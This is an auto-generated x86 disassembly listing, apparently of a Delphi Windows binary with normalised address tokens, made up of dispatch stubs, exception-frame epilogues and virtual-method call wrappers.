jmp eax
sub_471e90
retn
sub_471e94
mov eax 0x4b
call sub_472774
jmp eax
sub_471ea0
retn
sub_471ea4
mov eax 0x4c
call sub_472774
jmp eax
sub_471eb0
retn
sub_471eb4
mov eax 0x4d
call sub_472774
jmp eax
sub_471ec0
retn
sub_471ec4
mov eax 0x4e
call sub_472774
jmp eax
sub_471ed0
retn
sub_471ed4
mov eax 0x4f
call sub_472774
jmp eax
sub_471ee0
retn
sub_471ee4
mov eax 0x50
call sub_472774
jmp eax
sub_471ef0
retn
sub_471ef4
mov eax 0x51
call sub_472774
jmp eax
sub_471f00
retn
sub_471f04
mov eax 0x52
call sub_472774
jmp eax
sub_471f10
retn
sub_471f14
mov eax 0x53
call sub_472774
jmp eax
sub_471f20
retn
sub_471f24
mov eax 0x54
call sub_472774
jmp eax
sub_471f30
retn
sub_471f34
mov eax 0x55
call sub_472774
jmp eax
sub_471f40
retn
sub_471f44
mov eax 0x56
call sub_472774
jmp eax
sub_471f50
retn
sub_471f54
mov eax 0x57
call sub_472774
jmp eax
sub_471f60
retn
sub_471f64
mov eax 0x58
call sub_472774
jmp eax
sub_471f70
retn
sub_471f74
mov eax 0x59
call sub_472774
jmp eax
sub_471f80
retn
sub_471f84
mov eax 0x5a
call sub_472774
jmp eax
sub_471f90
retn
sub_471f94
mov eax 0x5b
call sub_472774
jmp eax
sub_471fa0
retn
sub_471fa4
mov eax 0x5c
call sub_472774
jmp eax
sub_471fb0
retn
sub_471fb4
mov eax 0x5d
call sub_472774
jmp eax
sub_471fc0
retn
sub_471fc4
mov eax 0x5e
call sub_472774
jmp eax
sub_471fd0
retn
sub_471fd4
mov eax 0x5f
call sub_472774
jmp eax
sub_471fe0
retn
sub_471fe4
mov eax 0x60
call sub_472774
jmp eax
sub_471ff0
retn
sub_471ff4
mov eax 0x61
call sub_472774
jmp eax
sub_472000
retn
sub_472004
mov eax 0x62
call sub_472774
jmp eax
sub_472010
retn
sub_472014
mov eax 0x63
call sub_472774
jmp eax
sub_472020
retn
sub_472024
mov eax 0x64
call sub_472774
jmp eax
sub_472030
retn
sub_472034
mov eax 0x65
call sub_472774
jmp eax
sub_472040
retn
sub_472044
mov eax 0x66
call sub_472774
jmp eax
sub_472050
retn
sub_472054
mov eax 0x67
call sub_472774
jmp eax
sub_472060
retn
sub_472064
mov eax 0x68
call sub_472774
jmp eax
sub_472070
retn
sub_472074
mov eax 0x69
call sub_472774
jmp eax
sub_472080
retn
sub_472084
mov eax 0x6a
call sub_472774
jmp eax
sub_472090
retn
sub_472094
mov eax 0x6b
call sub_472774
jmp eax
sub_4720a0
retn
sub_4720a4
mov eax 0x6c
call sub_472774
jmp eax
sub_4720b0
retn
sub_4720b4
mov eax 0x6d
call sub_472774
jmp eax
sub_4720c0
retn
sub_4720c4
mov eax 0x6e
call sub_472774
jmp eax
sub_4720d0
retn
sub_4720d4
mov eax 0x6f
call sub_472774
jmp eax
sub_4720e0
retn
sub_472817
jmp sub_403a2c
sub_47281e
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472919
jmp sub_403a2c
sub_472920
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_472984
jmp sub_403a2c
sub_47298b
pop ebp
retn
sub_472990
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_472828
sub_4729c5
jmp sub_403a2c
sub_4729cc
pop ebp
retn
sub_4729d0
sub [ rw-data ] 0x1
retn
sub_472c5c
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_472c68
retn
sub_472d0f
jmp sub_403a2c
sub_472d16
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_472d6e
jmp sub_403a2c
sub_472d75
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_472d7c
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_472d9c
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_47321a
jmp sub_403a2c
sub_473221
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473313
jmp sub_403a2c
sub_47331a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4733a8
jmp sub_403a2c
sub_4733af
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4733dd
jmp sub_403a2c
sub_4733e4
pop ebp
retn
sub_4733e8
sub [ rw-data ] 0x1
retn
sub_4735e2
jmp sub_403a2c
sub_4735e9
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4736c4
jmp sub_403a2c
sub_4736cb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47375f
jmp sub_403a2c
sub_473766
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4737dc
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_473920
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4739d3
jmp sub_403a2c
sub_4739da
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_473ab5
jmp sub_403a2c
sub_473abc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473ca8
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_473cb4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_473ccc
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_473cd8
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_4038a4#5
jmp sub_4038a4
sub_473db1
jmp sub_403a2c
sub_473db8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403778#4
jmp sub_403778
sub_473ee1
jmp sub_403a2c
sub_473ee8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473ef4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_473f00
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_473fa6
jmp sub_403a2c
sub_473fad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_474069
jmp sub_403a2c
sub_474070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47408d
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_474086
jmp sub_403a2c
sub_47408d
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_47415b
jmp sub_403a2c
sub_474162
pop ebx
mov esp ebp
pop ebp
retn
sub_47416b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47420e
jmp sub_403a2c
sub_474215
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4742ae
jmp sub_403a2c
sub_4742b5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47433a
jmp sub_403a2c
sub_474341
pop ecx
pop ebp
retn
sub_474344
mov eax [ eax + 0x4 ]
retn
sub_4743a2
jmp sub_403a2c
sub_4743a9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_474485
jmp sub_403a2c
sub_47448c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4744cd
jmp sub_403a2c
sub_4744d4
pop ebp
retn
sub_4744d8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ sub_4733f0 ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_473fd0
sub_474529
jmp sub_403a2c
sub_474530
pop ebp
retn
sub_474534
sub [ rw-data ] 0x1
retn
sub_4746f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c774
pop esi
pop ebx
retn
sub_474704
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_47484f
jmp sub_403a2c
sub_474856
pop ebx
pop ecx
pop ebp
retn
sub_4748fd
jmp sub_403a2c
sub_474904
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4749d9
jmp sub_403a2c
sub_4749e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_474aa8
push ebx
mov ebx eax
call GetCurrentThreadId
cmp eax [ ebx + 0x8 ]
sete al
pop ebx
retn
sub_474ac0
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_474ad4
call sub_421084
retn
sub_474adc
call sub_4046b0
retn
sub_474caf
jmp sub_403a2c
sub_474cb6
pop ebp
retn
sub_474d8b
jmp sub_403a2c
sub_474d92
pop ecx
pop ebp
retn
sub_474ec0
retn
j_sub_474ec0
jmp sub_474ec0
sub_474ec8
pop ebp
retn
sub_474ecc
sub [ rw-data ] 0x1
retn
sub_4750cb
jmp sub_403a2c
sub_4750d2
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4751ad
jmp sub_403a2c
sub_4751b4
pop ebp
retn
sub_4751b8
sub [ rw-data ] 0x1
retn
sub_475546
jmp sub_403a2c
sub_47554d
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4755d3
jmp sub_403a2c
sub_4755da
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40364c
sub_4756a3
jmp sub_403a2c
sub_4756aa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4757d4
jmp sub_403a2c
sub_4757db
pop ebp
retn
sub_4757e0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_47574c
call sub_403dd4
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c6ec
mov [ rw-data ] eax
sub_475e54
jmp sub_403a2c
sub_475e5b
pop ebx
mov esp ebp
pop ebp
retn
sub_476084
jmp sub_403a2c
sub_4760a1
jmp sub_403a2c
sub_4760a8
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476271
jmp sub_403a2c
sub_476278
mov al [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_476284
push ebx
mov ebx eax
mov eax ebx
call sub_419580
mov edx [ r-xdata ]
call sub_403460
mov edx [ ebx + 0x1c ]
mov [ eax + 0x1c ] edx
pop ebx
retn
sub_476319
jmp sub_403a2c
sub_476320
pop ebp
retn
sub_476324
sub [ rw-data ] 0x1
retn
sub_476714
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_476728
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x44 ]
sub_476738
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_47674c
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_476785
jmp sub_403a2c
sub_47678c
pop ebp
retn
sub_476790
sub [ rw-data ] 0x1
retn
sub_47687c
retn
sub_476880
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_4768b4
retn
sub_4768b8
retn
sub_4768e1
jmp sub_403a2c
sub_4768e8
pop ebp
retn
sub_4768ec
sub [ rw-data ] 0x1
retn
sub_476b10
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x14 ]
call sub_4040ac
pop ebx
retn
sub_476ced
jmp sub_403a2c
sub_476cf4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476e1b
jmp sub_403a2c
sub_476e22
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476e97
jmp sub_403a2c
sub_476e9e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_476eb8
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_476f78
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419728
pop esi
pop ebx
retn
sub_476fe1
jmp sub_403a2c
sub_476fe8
pop ebp
retn
sub_476fec
sub [ rw-data ] 0x1
retn
sub_4774f5
jmp sub_403a2c
sub_4774fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4038a4#9
jmp sub_4038a4
sub_47770b
jmp sub_4038a4
sub_477847
jmp sub_403778
sub_477a98
jmp sub_403778
sub_477ae7
jmp sub_403a2c
sub_477aee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477b39
jmp sub_403a2c
sub_477b40
pop ebp
retn
sub_477b44
sub [ rw-data ] 0x1
retn
sub_477b71
jmp sub_403a2c
sub_477b78
pop ebp
retn
sub_477b7c
sub [ rw-data ] 0x1
retn
sub_477ba9
jmp sub_403a2c
sub_477bb0
pop ebp
retn
sub_477bb4
sub [ rw-data ] 0x1
retn
sub_477ed5
jmp sub_403a2c
sub_477edc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477ef9
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_477ef2
jmp sub_403a2c
sub_477ef9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4780d1
jmp sub_403a2c
sub_4780d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_4780e4
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_478164
mov eax [ eax + 0x68 ]
call sub_475f70
retn
sub_4781e0
jmp sub_403a2c
sub_4781e7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478260
jmp sub_403a2c
sub_478267
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4783c1
jmp sub_4038a4
sub_4783c6
add [ eax ] eax
add [ eax ] al
push 0xd2004072
add [ edi ] 0xffffff89
retn
sub_47841d
jmp sub_403a2c
sub_478424
pop ebp
retn
sub_478428
sub [ rw-data ] 0x1
retn
sub_478a7c
jmp sub_403a2c
sub_478a83
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478aa0
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_478a99
jmp sub_403a2c
sub_478aa0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_478b6c
jmp sub_403a2c
sub_478b73
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_478d24
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_478dbd
jmp sub_403a2c
sub_478dc4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478e22
jmp sub_403a2c
sub_478e29
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479134
jmp sub_403a2c
sub_47913b
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_479366
jmp sub_403a2c
sub_47936d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4793fa
jmp sub_403a2c
sub_479401
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479414
push ebx
mov ebx eax
mov eax [ ebx + 0x74 ]
call sub_47a20c
mov [ ebx + 0x69 ] 0x0
pop ebx
retn
sub_479480
mov ecx edx
mov [ eax + 0x78 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_421440
sub_479691
jmp sub_403a2c
sub_479710
jmp sub_403a2c
sub_479717
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4797e5
jmp sub_403a2c
sub_479842
jmp sub_403a2c
sub_479849
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4798d0
jmp sub_403a2c
sub_4798d7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479a22
jmp sub_403a2c
sub_479a29
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479a48
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_479a41
jmp sub_403a2c
sub_479a48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479a65
lea eax [ ebp - 0x14 ]
call sub_4040ac
retn
sub_479a5e
jmp sub_403a2c
sub_479a65
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_479b54
mov eax [ eax + 0xb0 ]
call sub_41b5dc
retn
sub_479d4a
jmp sub_403a2c
sub_479d51
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_479d5f
inc [ ebx ]
add [ eax ] al
add [ eax ] cl
and [ eax ] cl
add [ ebx + 0x6a ] dl
add [ ecx + 0x1 ] bh
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_479e46
jmp sub_403a2c
sub_479e4d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479f29
jmp sub_403a2c
sub_479f30
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47a082
jmp sub_403a2c
sub_47a089
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a0b3
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_4040d0
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_47a0ac
jmp sub_403a2c
sub_47a0b3
pop ebx
mov esp ebp
pop ebp
retn
sub_47a112
jmp sub_403a2c
sub_47a119
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47a1c6
jmp sub_403a2c
sub_47a1cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a1ec
push ecx
mov edx esp
mov ecx 0x1
call sub_478e30
mov al [ esp ]
pop edx
retn
sub_47a200
push ebx
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_47a20c
push ebx
mov ebx eax
mov eax ebx
call sub_41b5dc
xor eax eax
mov [ ebx + 0x24 ] eax
pop ebx
retn
sub_47a2f4
jmp sub_403a2c
sub_47a2fb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47a304
mov edx [ eax + 0x4 ]
add edx [ eax + 0x24 ]
mov eax edx
retn
sub_47a3fc
jmp sub_403a2c
sub_47a403
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47a465
jmp sub_403a2c
sub_47a46c
pop ebp
retn
sub_47a470
sub [ rw-data ] 0x1
retn
sub_47a706
jmp sub_403a2c
sub_47a70d
pop ebx
pop ecx
pop ebp
retn
sub_47a714
retn
sub_47a718
retn
sub_47a71c
retn
sub_47a720
retn
sub_47a7eb
jmp sub_403a2c
sub_47a7f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_47a808
jmp sub_403a2c
sub_47a832
jmp sub_403a2c
sub_47a839
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4038a4#8
jmp sub_4038a4
j_sub_403778#3
jmp sub_403778
sub_47a9b6
jmp sub_403a2c
sub_47a9bd
pop ecx
pop ebp
retn
sub_47aa1e
jmp sub_403a2c
sub_47aa25
pop ecx
pop ebp
retn
sub_47aa8b
jmp sub_403a2c
sub_47aaa0
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_47aab4
push ebx
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_47aacc
mov [ eax + 0x49 ] 0x1
call sub_4212c4
retn
sub_47aad8
add eax 0x40
call sub_40d564
retn
sub_47ab09
jmp sub_403a2c
sub_47ab10
pop ebp
retn
sub_47ab14
sub [ rw-data ] 0x1
retn
sub_47ac75
jmp sub_403a2c
sub_47ac7c
pop ebp
retn
sub_47ac80
sub [ rw-data ] 0x1
retn
sub_47ad91
jmp sub_403a2c
sub_47ad98
pop ebp
retn
sub_47ad9c
sub [ rw-data ] 0x1
retn
sub_47af61
jmp sub_403a2c
sub_47af68
pop ebp
retn
sub_47af6c
sub [ rw-data ] 0x1
retn
sub_47b048
jmp sub_403a2c
sub_47b04f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b189
jmp sub_403a2c
sub_47b190
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b1bd
jmp sub_403a2c
sub_47b1c4
pop ebp
retn
sub_47b1c8
sub [ rw-data ] 0x1
retn
sub_47b215
jmp sub_403a2c
sub_47b24d
jmp sub_403a2c
sub_47b254
pop ebp
retn
sub_47b258
sub [ rw-data ] 0x1
retn
sub_47b4a7
jmp sub_403a2c
sub_47b4ae
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b4e8
retn
sub_47b511
jmp sub_403a2c
sub_47b518
pop ebp
retn
sub_47b51c
sub [ rw-data ] 0x1
retn
sub_47b688
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_47bece
inc edi
add [ eax ] ch

sub_47bed2
inc edi
add [ eax ] dh

sub_47c5a4
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_47c5c4
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
push edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_47c620
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_47c63c
push ebx
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_47c76e
jmp sub_403a2c
sub_47c7b2
jmp sub_403a2c
sub_47c7b9
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c7d0
push ebx
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_47c878
jmp sub_403a2c
sub_47c87f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c884
mov eax [ eax + 0x70 ]
mov eax [ eax + 0x1c ]
retn
sub_47cafe
jmp sub_403a2c
sub_47cb18
push esi
mov esi eax
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47cb28
mov eax [ eax + 0x70 ]
mov [ eax + 0x1c ] edx
retn
sub_47cb30
mov ecx edx
mov [ eax + 0x84 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_421440
sub_47cc48
jmp sub_403a2c
sub_47ccec
jmp sub_403a2c
sub_47cd74
jmp sub_403a2c
sub_47cd7b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47cdb8
retn
sub_47cdbc
push ebx
mov ebx eax
mov eax ebx
call sub_47a718
mov dl 0x1
mov eax [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
j_sub_4038a4#4
jmp sub_4038a4
sub_47cf59
add [ eax ] eax
add [ eax ] al
push 0x65004072
iretd
sub_47cf63
inc edi
add [ ecx - 0xb827c3d ] cl
add [ eax + ecx - 0x73 ] dh
inc ebp
hlt
sub_47d021
jmp sub_403778
sub_47d090
mov edx [ eax + 0x68 ]
mov edx [ edx + 0xb8 ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x40 ]
retn
j_sub_4038a4#3
jmp sub_4038a4
sub_47d21e
jmp sub_4038a4
sub_47d266
jmp sub_403a2c
sub_47d26d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47d2b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419728
pop esi
pop ebx
retn
sub_47d2cc
push esi
mov si 0xffff
call sub_4034ac
pop esi
retn
j_sub_4038a4#7
jmp sub_4038a4
sub_47d5cb
jmp sub_403a2c
sub_47d5f5
jmp sub_403a2c
sub_47d5fc
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d6cf
jmp sub_403a2c
sub_47d6d6
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47d72c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_404100
pop esi
pop ebx
retn
sub_47d7bd
jmp sub_403a2c
sub_47d7c4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47d7f4
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47d8a8
push ebx
mov edx [ eax + 0x4 ]
cmp [ edx + 0x22 ] 0x0
je r-xdata
pop ebx
retn
mov ebx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_47d915
jmp sub_403a2c
sub_47d91c
pop ebp
retn
sub_47d920
sub [ rw-data ] 0x1
retn
sub_47d9fa
inc edi
add [ eax ] ch

sub_47d9fe
inc edi
add [ eax ] dh

sub_47db3d
jmp sub_403a2c
sub_47db44
pop ebp
retn
sub_47db48
sub [ rw-data ] 0x1
retn
sub_47df02
jmp sub_403a2c
sub_47df09
pop ebx
pop ecx
pop ebp
retn
sub_47df78
push ebx
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_47df98
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0xc8 ]
mov edx esi
call sub_404100
pop esi
pop ebx
retn
sub_47dfb0
mov [ eax + 0xdc ] edx
retn
sub_47dfdd
jmp sub_403a2c
sub_47dfe4
pop ebp
retn
sub_47dfe8
sub [ rw-data ] 0x1
retn
sub_47e226
inc edi
add [ eax ] ch

sub_47e22a
inc edi
add [ eax ] dh

sub_47e5a2
inc edi
add [ eax ] ch

sub_47e5a6
inc edi
add [ eax ] dh

sub_47e706
inc edi
add [ eax ] ch

sub_47e814
push ebx
cmp [ eax + 0xc2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_47e84c
push ebx
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_47e868
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_47e8dc
push ebx
mov ebx edx
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x68 ]
call sub_47a0c4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
pop ebx
retn
sub_47ea55
jmp sub_403a2c
sub_47ea5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ea7e
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4040d0
retn
sub_47ea77
jmp sub_403a2c
sub_47ea7e
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47ea88
mov ecx [ eax + 0xc0 ]
mov [ edx ] ecx
mov ecx [ eax + 0xc4 ]
mov [ edx + 0x4 ] ecx
retn
sub_47ea9c
mov ecx [ eax + 0xd8 ]
mov [ edx ] ecx
mov ecx [ eax + 0xdc ]
mov [ edx + 0x4 ] ecx
retn
sub_47eab0
mov ecx [ eax + 0xc8 ]
mov [ edx ] ecx
mov ecx [ eax + 0xcc ]
mov [ edx + 0x4 ] ecx
retn
sub_47eac4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0xc0 ] edx
